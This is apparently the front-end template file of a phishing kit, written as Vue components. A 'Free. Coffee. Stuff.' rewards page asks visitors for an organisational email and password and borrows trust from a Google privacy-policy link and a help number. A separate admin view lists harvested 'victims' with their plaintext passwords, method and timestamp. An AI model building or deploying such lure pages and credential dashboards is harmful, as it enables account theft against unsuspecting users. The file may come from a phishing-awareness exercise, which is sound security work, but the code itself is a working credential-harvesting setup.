<template id="rewards-page">
  <div class="vue-component">
    <div class="container">
      <div class="account-wall">
        <form>
          <div class="form-group">
            <img class="profile-img" src="img/buxxsphere.jpg" alt=""></img>
            <h1 class="text-center login-title">Free. Coffee. Stuff.</h1>
            <h2 class="text-center friends-text">Our Sincerest Congratulations For Being Security Conscious</h2>
          </div>

          <div class="form-signin">
            <div class="form-group">
              <input v-model="email" type="text" placeholder="username@ucanchicago.org" class="form-control">
              <input v-model="password" type="password" placeholder="password" class="form-control"><br>
            </div>

            <div class="form-group">
              <div class="">
                <ul>
                  <li class="text-danger" v-for="error in errors">{{ error }}</li>
                </ul>
              </div>
              <button v-on:click="submit()" id="btn" class="btn btn-primary btn-block btn-xlarge btn-sharp"
                type="submit">Accept &amp; Receive Code</button>
              <div class="text-center terms-text1">I agree to the <a href="#" class="url-color" id="btn1">Terms of
                  Service</a> and have</div>
              <div class="text-center terms-text2"> reviewed the <a href="#" class="url-color">Google Privacy Policy</a>
              </div>
              <div class="text-center terms-text3">Need help? <a href="#" class="url-color">855-446-2374</a></div>
            </div>
          </div>

        </form>
      </div>
    </div>
  </div>
</template>


<template id="login-page">
  <div class="vue-component">
    <div class="container">
      <div class="card">
        <form>
          <h1>Login</h1>
          <ul>
            <li class="text-danger" v-for="error in errors">{{ error }}</li>
          </ul>
          <div class="form-group">
            <label>Email:</label>
            <input type="email" class="form-control" v-model="email">
          </div>
          <div class="form-group">
            <label>Password:</label>
            <input type="password" class="form-control" v-model="password">
          </div>
          <button class="btn btn-primary" v-on:click="submit()">Submit</button>
        </form>
      </div>
    </div>
  </div>
</template>


<template id="show-page">
  <div class="vue-component">

    <h1>{{ message }}</h1>

    <table class="table table-dark">
      <thead>
        <tr>
          <th scope="col">#</th>
          <th scope="col">Email</th>
          <th scope="col">Password</th>
          <th scope="col">Method</th>
          <th scope="col">Created at</th>
        </tr>
      </thead>
      <tbody>
        <tr v-for="victim in victims">
          <th scope="row">{{ victim.id }}</th>
          <td>{{ victim.email }}</td>
          <td>{{ victim.password }}</td>
          <td>{{ victim.method }}</td>
          <td>{{ victim.created_at }}</td>
        </tr>
      </tbody>
    </table>

  </div>
</template>
